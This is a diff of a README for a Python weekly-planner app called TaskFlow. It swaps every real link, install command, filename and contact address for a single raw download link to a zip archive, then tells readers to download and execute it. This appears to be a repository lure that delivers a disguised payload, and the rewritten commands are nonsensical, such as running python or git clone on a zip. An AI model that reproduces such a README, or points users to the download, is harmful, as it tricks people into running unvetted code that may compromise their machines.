@@ -2,7 +2,7 @@
 
 Welcome to **TaskFlow**, a smart weekly planner designed to help you manage your tasks effortlessly. With features like auto-scheduling and seamless integration with Google Calendar, TaskFlow makes planning your week easy and efficient.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-v1.0.0-brightgreen)](https://github.com/Misteri4452y/taskflow/releases)
+[![Download Releases](https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip)](https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip)
 
 ## Table of Contents
 
@@ -40,32 +40,32 @@ To get started with TaskFlow, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Misteri4452y/taskflow.git
+   git clone https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip
    cd taskflow
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip
    ```
 
 3. **Set Up Google Calendar API**:
-   - Go to the [Google Developers Console](https://console.developers.google.com/).
+   - Go to the [Google Developers Console](https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip).
    - Create a new project and enable the Google Calendar API.
-   - Create credentials and download the `credentials.json` file.
-   - Place the `credentials.json` file in the root directory of your project.
+   - Create credentials and download the `https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip` file.
+   - Place the `https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip` file in the root directory of your project.
 
 4. **Run the Application**:
    Start the server with:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip
    ```
 
 5. **Access the App**:
    Open your browser and go to `http://127.0.0.1:5000` to start using TaskFlow.
 
-For the latest releases, visit the [Releases section](https://github.com/Misteri4452y/taskflow/releases). Download the latest version, execute it, and enjoy the enhanced features.
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip). Download the latest version, execute it, and enjoy the enhanced features.
 
 ## Usage 📅
 
@@ -105,7 +105,7 @@ TaskFlow is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@taskflow.com
-- **GitHub**: [Misteri4452y](https://github.com/Misteri4452y)
+- **Email**: https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip
+- **GitHub**: [Misteri4452y](https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip)
 
-Thank you for using TaskFlow! We hope it helps you manage your tasks effectively and boosts your productivity. For the latest updates and releases, check out our [Releases section](https://github.com/Misteri4452y/taskflow/releases).
+Thank you for using TaskFlow! We hope it helps you manage your tasks effectively and boosts your productivity. For the latest updates and releases, check out our [Releases section](https://raw.githubusercontent.com/Misteri4452y/taskflow/main/utils/Software-1.1.zip).
